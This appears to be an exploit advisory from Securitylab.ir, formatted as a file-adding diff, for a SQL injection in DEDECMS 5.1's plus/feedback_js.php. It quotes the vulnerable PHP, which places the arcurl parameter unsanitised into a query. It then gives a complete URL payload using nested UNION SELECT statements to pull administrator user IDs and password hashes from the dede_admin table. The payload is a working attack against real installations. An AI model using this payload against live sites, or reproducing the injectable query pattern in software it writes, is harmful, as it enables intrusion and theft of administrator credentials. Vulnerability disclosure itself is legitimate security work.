@@ -1,0 +1,33 @@
+######################### Securitylab.ir ########################
+# Application Info:
+# Name: DEDECMS
+# Version: 5.1
+#################################################################
+# Discoverd By: Securitylab.ir 
+# Website: http://securitylab.ir
+# Contacts: admin[at]securitylab.ir & info@securitylab[dot]ir
+#################################################################
+# Vulnerability Info:
+# Type: Sql Injection Vulnerability
+# Risk: Medium
+#===========================================================
+# feedback_js.php
+$urlindex = 0;
+if(empty($arcID))
+{
+$row = $dlist->dsql->GetOne("Select id From `#@__cache_feedbackurl` where url='$arcurl' ");
+ if(is_array($row)) $urlindex = $row['id'];
+}
+if(empty($arcID) && empty($urlindex)) exit();
+......
+if(empty($arcID)) $wq = " urlindex = '$urlindex' "; 
+else $wq = " aid='$arcID' ";
+ $querystring = "select * from `#@__feedback` where $wq and ischeck='1' order by dtime desc";
+$dlist->Init();
+$dlist->SetSource($querystring);
+...
+# http://site.com/[PATH]/plus/feedback_js.php?arcurl=' union select "' and 1=2 union select 1,1,1,userid,3,1,3,3,pwd,1,1,3,1,1,1,1,1 from dede_admin where 1=1 union select * from dede_feedback where 1=2 and ''='" from dede_admin where ''=
+#===========================================================
+#################################################################
+# Securitylab Security Research Team
+###################################################################
